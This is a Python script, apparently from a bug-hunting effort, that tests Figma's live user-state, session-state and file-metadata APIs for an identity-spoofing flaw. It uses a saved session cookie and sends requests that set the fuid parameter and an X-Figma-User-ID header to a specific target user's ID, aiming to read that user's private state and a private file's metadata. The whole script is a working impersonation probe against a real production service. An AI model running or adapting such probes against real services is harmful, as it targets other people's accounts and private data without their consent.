"""Figma /api/user/state + /api/session/state + file_metadata 身份参数测试

创造目标：fuid / X-Figma-User-ID 参数如果被服务端信任为身份 →
用目标用户 fuid 调接口拿目标用户视角状态（含用户私有信息）。

接口路径全部来自 editor_page.html EARLY_ARGS + JS 明文（确定性来源）：
  GET /api/user/state?team_id=&file_key=&fuid=
  GET /api/session/state?fuid=
  GET /api/file_metadata/:file_key

对照组：
  1. 匿名无 fuid（基准）
  2. 登录态 + fuid=自己（基准，应 200）
  3. 登录态 + fuid=目标用户 1484993095538571712（冒充）
  4. 登录态 + X-Figma-User-ID=目标用户（header 冒充）
  5. 匿名 + fuid=目标用户（无 cookie 纯参数冒充）
  6. 登录态 + fuid=不存在用户（对照）
"""
import json, sys, time
import requests

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SESS = json.load(open(r"D:\scan\_figma_hunt\figma_session.json"))
CK = {c["name"]: c["value"] for c in SESS if c.get("name") and c.get("value")}
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36"}

TEAM = "1666382706663462213"
FILE = "qzDqStIDJyGbthpKiuvfwg"
SELF = "1666382703778278399"
TARGET = "1484993095538571712"
GHOST = "9999999999999999999"

ENDPOINTS = [
    ("user/state(fuid)", f"/api/user/state?team_id={TEAM}&file_key={FILE}&fuid="),
    ("session/state(fuid)", f"/api/session/state?fuid="),
    ("file_metadata", "/api/file_metadata/"),
]

def test(label, url, cookies=None, headers=None, anon=False):
    h = dict(UA)
    if headers:
        h.update(headers)
    try:
        r = requests.get("https://www.figma.com" + url, cookies=cookies, headers=h, timeout=12)
        body = r.text[:300].replace("\n", " ")
        print(f"  {r.status_code} | {body}")
    except Exception as e:
        print(f"  ERR {type(e).__name__} {e}")

print("=== A. 匿名基准 ===")
for name, path in ENDPOINTS:
    u = path + (SELF if path.endswith("fuid=") or path.endswith("/") else "")
    u = path + (SELF if "fuid" in path else "")  # file_metadata 用自己 file 不行，用目标文件？先测公开文件
    test(name, u, anon=True)

print("\n=== B. 登录态 + fuid=自己 ===")
for name, path in ENDPOINTS:
    u = path + (SELF if "fuid" in path else "bv2nMIdFf4u3dESGail4sm")
    test(name, u, CK)

print("\n=== C. 登录态 + fuid=目标用户（冒充） ===")
for name, path in ENDPOINTS:
    u = path + (TARGET if "fuid" in path else "bv2nMIdFf4u3dESGail4sm")
    test(name, u, CK)

print("\n=== D. 登录态 + X-Figma-User-ID=目标用户 ===")
for name, path in ENDPOINTS:
    u = path + (SELF if "fuid" in path else "bv2nMIdFf4u3dESGail4sm")
    test(name, u, CK, {"X-Figma-User-ID": TARGET})

print("\n=== E. 匿名 + fuid=目标用户（纯参数） ===")
for name, path in ENDPOINTS:
    u = path + (TARGET if "fuid" in path else "bv2nMIdFf4u3dESGail4sm")
    test(name, u)

print("\n=== F. 登录态 + fuid=不存在用户 ===")
for name, path in ENDPOINTS:
    u = path + (GHOST if "fuid" in path else "bv2nMIdFf4u3dESGail4sm")
    test(name, u, CK)

print("\n=== G. 私有文件 file_metadata（登录态/匿名） ===")
for ck, label in [(None, "匿名"), (CK, "登录")]:
    test(f"file_metadata 私有 {label}", "/api/file_metadata/qzDqStIDJyGbthpKiuvfwg", ck)
